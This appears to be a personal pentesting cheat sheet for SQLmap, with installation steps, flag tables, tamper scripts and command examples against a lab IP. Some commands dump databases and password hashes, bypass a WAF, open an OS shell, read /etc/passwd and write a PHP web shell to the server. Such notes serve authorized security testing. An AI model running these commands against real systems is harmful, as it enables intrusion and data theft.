---
title: SQLmap
tags:
  - tool
  - web
  - sql-injection
  - exploitation
  - automation
  - intermediate
category: web
platform: cross-platform
install: apt install sqlmap / git clone https://github.com/sqlmapproject/sqlmap
created: 2026-03-23
updated: 2026-04-04
difficulty: intermediate
---

# 🛠️ SQLmap

## What It Is
SQLmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports all major database management systems (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.) and can extract data, enumerate databases, read/write files, and even achieve OS command execution in some configurations.

## Installation
```bash
# Kali (pre-installed)
sqlmap --version

# Git (latest)
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python3 sqlmap.py --version

# Debian/Ubuntu
sudo apt install sqlmap
```

## Basic Syntax
```bash
sqlmap -u "URL" [options]
sqlmap -u "http://target.com/page?id=1" --dbs
```

---

## Common Commands / Use Cases

### Test a URL parameter for SQLi
```bash
sqlmap -u "http://10.10.10.10/item?id=1"
```

### Enumerate databases
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --dbs
```

### Enumerate tables in a database
```bash
sqlmap -u "http://10.10.10.10/item?id=1" -D database_name --tables
```

### Dump columns in a table
```bash
sqlmap -u "http://10.10.10.10/item?id=1" -D database_name -T table_name --columns
```

### Dump data from a table
```bash
sqlmap -u "http://10.10.10.10/item?id=1" -D database_name -T users --dump
```

### Dump everything (all DBs, all tables)
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --dump-all
```

### Test a POST request (from Burp Suite)
```bash
# Capture request in Burp → Save as file (request.txt)
sqlmap -r request.txt

# Or specify POST data manually
sqlmap -u "http://10.10.10.10/login" --data="username=admin&password=test"
```

### Test with cookies (authenticated session)
```bash
sqlmap -u "http://10.10.10.10/dashboard?id=1" --cookie="PHPSESSID=abc123; security=low"
```

### Test with custom headers
```bash
sqlmap -u "http://10.10.10.10/api" -H "Authorization: Bearer TOKEN" --data="id=1"
```

### Specify injection parameter
```bash
sqlmap -u "http://10.10.10.10/item?id=1&category=shoes" -p id
```

### Bypass WAF with tamper scripts
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --tamper=space2comment
sqlmap -u "http://10.10.10.10/item?id=1" --tamper=between,randomcase,space2comment
```

### OS shell (if DB user has FILE privileges)
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --os-shell
```

### Read a file from the server
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --file-read="/etc/passwd"
```

### Write a file to the server (web shell)
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```

### Get current DB user
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --current-user
```

### Check if DB user is DBA
```bash
sqlmap -u "http://10.10.10.10/item?id=1" --is-dba
```

---

## Important Flags / Options

| Flag | Description |
|---|---|
| `-u` | Target URL |
| `-r` | Load request from file (Burp export) |
| `--data` | POST data string |
| `--cookie` | HTTP cookie header |
| `-H` | Custom HTTP header |
| `-p` | Specify parameter to test |
| `--dbs` | Enumerate databases |
| `-D` | Target database name |
| `--tables` | Enumerate tables |
| `-T` | Target table name |
| `--columns` | Enumerate columns |
| `-C` | Target column(s) |
| `--dump` | Dump table data |
| `--dump-all` | Dump all databases |
| `--current-user` | Get current DB user |
| `--current-db` | Get current database |
| `--is-dba` | Check if current user is DBA |
| `--users` | Enumerate DB users |
| `--passwords` | Enumerate DB password hashes |
| `--privileges` | Enumerate user privileges |
| `--file-read` | Read file from server |
| `--file-write` | Write file to server |
| `--os-shell` | Interactive OS shell |
| `--os-cmd` | Run single OS command |
| `--batch` | Non-interactive (auto-accept defaults) |
| `--level` | Test depth 1-5 (default 1; higher = more tests) |
| `--risk` | Risk level 1-3 (default 1; higher = more aggressive) |
| `--dbms` | Specify DBMS (mysql, postgres, mssql, oracle, sqlite) |
| `--technique` | Specify injection technique (B=boolean, T=time, U=union, E=error, S=stacked) |
| `--tamper` | Apply tamper script(s) for WAF bypass |
| `--random-agent` | Use random User-Agent |
| `--proxy` | Route through proxy (e.g., Burp: `http://127.0.0.1:8080`) |
| `--tor` | Route through Tor |
| `--threads` | Number of concurrent threads (default 1) |
| `--output-dir` | Custom output directory |
| `-v` | Verbosity 0-6 (default 1; 3 shows payloads) |

---

## Injection Techniques

| Code | Technique | Speed | Notes |
|---|---|---|---|
| B | Boolean-based blind | Slow | Infers data bit-by-bit from true/false responses |
| T | Time-based blind | Very slow | Uses DB sleep() to infer data |
| E | Error-based | Fast | DB error messages reveal data |
| U | UNION-based | Fast | Appends UNION SELECT to return data directly |
| S | Stacked queries | Varies | Multiple statements separated by `;` |
| Q | Inline queries | Fast | Subquery injection |

---

## Common Tamper Scripts

| Script | Purpose |
|---|---|
| `space2comment` | Replace spaces with `/**/` |
| `between` | Replace `>` with `BETWEEN` |
| `randomcase` | Random case on SQL keywords |
| `charencode` | URL-encode characters |
| `base64encode` | Base64-encode payload |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST()` |
| `modsecurityversioned` | MySQL versioned comments for ModSecurity bypass |

---

## Opsec / Legal Notes
> ⚠️ SQLmap will send many crafted requests to the target. This is extremely noisy and will appear in web server logs and WAF alerts. Only run against applications you have explicit written authorization to test.
- Always specify `--batch` for automated runs to avoid interactive prompts
- Use `--proxy=http://127.0.0.1:8080` to route through Burp for review
- Use `-v 3` to see payloads being sent
- Start with `--level=1 --risk=1`; escalate only if needed

## Related Tools
- [[Burp-Suite]] — intercept and extract requests for `-r` mode
- [[Gobuster]] — discover vulnerable endpoints before SQLmap
- OWASP-Top-10 — A03 Injection context

## Related Notes
- OWASP-Top-10
- Networking-Basics

## References
- Official docs: https://sqlmap.org/
- GitHub: https://github.com/sqlmapproject/sqlmap
- Wiki: https://github.com/sqlmapproject/sqlmap/wiki


## See Also

- OWASP-Top-10
- Web-Application-Testing
- Penetration-Testing-Methodology
- Burp-Suite

---
<- [[Tools-MOC]]